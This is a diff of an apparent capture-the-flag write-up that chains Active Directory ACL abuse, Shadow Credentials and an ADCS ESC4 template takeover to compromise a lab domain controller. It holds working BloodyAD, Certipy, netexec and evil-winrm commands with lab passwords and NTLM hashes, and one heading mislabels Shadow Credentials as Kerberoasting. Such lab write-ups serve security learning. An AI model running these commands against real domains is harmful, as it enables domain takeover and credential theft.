@@ -130,7 +130,9 @@ Service detection performed. Please report any incorrect results at https://nmap
 # Nmap done at Fri Jun 13 12:47:06 2025 -- 1 IP address (1 host up) scanned in 222.04 seconds
 
 
-We can identify it as a domain controller based on the open ports. Next, let’s add sequel.htb and dc01.sequel.htb to our /etc/hosts file.
+Based on the open ports and service banners (LDAP, Kerberos, SMB), we can confidently identify this host as the Domain Controller.
+
+Let's add sequel.htb and dc01.sequel.htb to our /etc/hosts for easier referencing.
 
 10.10.11.51 DC01.sequel.htb sequel.htb DC01
 
@@ -446,52 +448,139 @@ I initiated a PowerShell query to enumerate Ryan's permissions on Active Directo
 
 $u="SEQUEL\ryan";Get-ADUser -Filter *|%{$dn="AD:$($_.DistinguishedName)";$a=Get-Acl $dn;$h=$a.Access|?{$_.IdentityReference -eq $u -and $_.ActiveDirectoryRights -match 'WriteOwner|GenericAll|GenericWrite|All'};if($h){Write-Host "User: $($_.Name)" -ForegroundColor Cyan;$h|fl;Write-Host "-----" -ForegroundColor DarkGray}}
 
-Ryan had WriteOwner rights over the Certification Authority object.
+Targeted Kerberoasting Attack Primer:
+
+To execute this attack, we need at least one of the following privileges on the target user:
+        WriteOwner
+        GenericAll
+        GenericWrite
+        WriteProperty
+        Validated-SPN
+        WriteProperties
+Fortunately, our user Ryan has WriteOwner, which grants the ability to take ownership of the object and modify its security descriptor — even if the DACL doesn’t explicitly allow it.
+
 
 This permission enables a user to change the ownership of the targeted object — which in Active Directory can open the door to full control, allowing for privilege escalation via manipulation of access control or delegation paths.
 
 ```
 
-##  Takeover ca_svc via ACL Abuse
+## 🔓 Takeover ca\_svc via ACL Abuse
+
+To escalate privileges further, I used BloodyAD to assign full control (GenericAll) over the `ca_svc` account to my controlled user `ryan`. This allowed me to perform a Shadow Credentials attack using Certipy.
 
 ```bash
-
+bloodyAD -d sequel.htb --host 10.10.11.51 -u ryan -p WqSZAF6CysDQbGb3 set owner ca_svc ryan
+bloodyAD -d sequel.htb --host 10.10.11.51 -u ryan -p WqSZAF6CysDQbGb3 add genericAll ca_svc ryan
 ```
 
-## ADCS Abuse (ESC1 / ESC4)
+Once GenericAll was granted, I executed Certipy's `shadow auto` to add a KeyCredential to `ca_svc`:
 
 ```bash
-Using certipy, I began enumerating the environment for vulnerable certificate templates:
+certipy shadow auto -u ryan@sequel.htb -p WqSZAF6CysDQbGb3 -account 'ca_svc' -dc-ip 10.10.11.51
+```
 
+Certipy v4.8.2 returned:
+
+```
+[*] Got TGT
+[*] Saved credential cache to 'ca_svc.ccache'
+[*] Trying to retrieve NT hash for 'ca_svc'
+[*] NT hash for 'ca_svc': 3b181b914e7a9d5508ea1e20bc2b7fce
+```
+
+Using this hash, I confirmed that `ca_svc` had valid SMB access:
+
+```bash
+netexec smb DC01.sequel.htb -u 'ca_svc' -H '3b181b914e7a9d5508ea1e20bc2b7fce'
+```
+
+This provided stable authentication, confirming that `ca_svc` was fully compromised.
+
+---
+
+## 🏛️ ADCS Abuse (ESC1 / ESC4)
+
+Using `certipy`, I began enumerating certificate templates:
+
+```bash
 certipy-ad find -u ryan@sequel.htb -p 'WqSZAF6CysDQbGb3' -dc-ip 10.10.11.51
+```
 
-From the output, one particularly interesting certificate template stood out:
+Among the output, one template stood out:
 
+```
 Template Name            : DunderMifflinAuthentication
 Enabled                  : True
 Enrollment Rights        : SEQUEL.HTB\Domain Admins, SEQUEL.HTB\Enterprise Admins
 Full Control Principals  : SEQUEL.HTB\Cert Publishers
 Write Owner Principals   : SEQUEL.HTB\Cert Publishers
 Write Dacl Principals    : SEQUEL.HTB\Cert Publishers
-Write Property Enroll    : SEQUEL.HTB\Cert Publishers
+```
 
-The DunderMifflinAuthentication template is enabled, allows for Client Authentication, and has autoenrollment enabled. While enrollment is limited to high-privileged groups like Domain Admins, control permissions are delegated to the Cert Publishers group.
+Because `ca_svc` was in `Cert Publishers`, I could control this template. I used Certipy to modify its permissions via Kerberos auth:
 
-Since I had already compromised the ca_svc account — which is a member of Cert Publishers — I was in a position to:
+```bash
+KRB5CCNAME=ca_svc.ccache certipy template -k -template DunderMifflinAuthentication -dc-ip 10.10.11.51 -target DC01.sequel.htb -debug
+```
 
-- Take ownership of the template
-- Modify its permissions (e.g., add Enroll rights for another user I control)
-- Request a certificate and authenticate as a domain admin
+Once permissions were updated, I requested a certificate for `administrator@sequel.htb`:
 
-This control over the template made it a viable target for ESC4 abuse (Certificate Template Permissions) using certipy.
+```bash
+certipy req -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -ca sequel-DC01-CA -target sequel.htb -template DunderMifflinAuthentication -upn administrator@sequel.htb -dc-ip 10.10.11.51 -debug
+```
 
 ```
+[*] Saved certificate and private key to 'administrator.pfx'
+```
+
+Using this `.pfx`, I authenticated as Administrator:
+
+```bash
+certipy auth -pfx administrator.pfx -domain sequel.htb
+```
+
+Output:
+
+```
+[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
+```
+
+And finally:
+
+```bash
+evil-winrm -i 10.10.11.51 -u 'administrator' -H '7a8d4e04986afa8ed4060f75e5a0b3ff'
+```
+
+Full domain compromise achieved.
+
+---
 
 ## 🪟 Admin Shell (WinRM)
 
 ```bash
-netexec winrm sequel.htb -u Administrator -H <NTLM_HASH>
+netexec winrm sequel.htb -u Administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff
 ```
+
+Once inside the Administrator shell:
+
+```powershell
+PS C:\Users\Administrator> type desktop\root.txt
+```
+
+---
+
+## 🔚 Conclusion
+
+This engagement demonstrated how ACL abuse, Shadow Credentials, and ADCS misconfigurations can be chained for full domain compromise.
+
+* Starting from a low-privileged user, we escalated via GenericAll and ADCS template permissions (ESC4)
+* Shadow Credentials offered a stealthy path without touching password hashes directly
+* Certipy and BloodHound were instrumental in mapping and exploiting these paths
+
+💡 Blue teams should regularly audit ADCS templates and remove excessive rights from groups like Cert Publishers.
+
+---
+
 
 ## 🔍 Blue Team Detection Tips
 
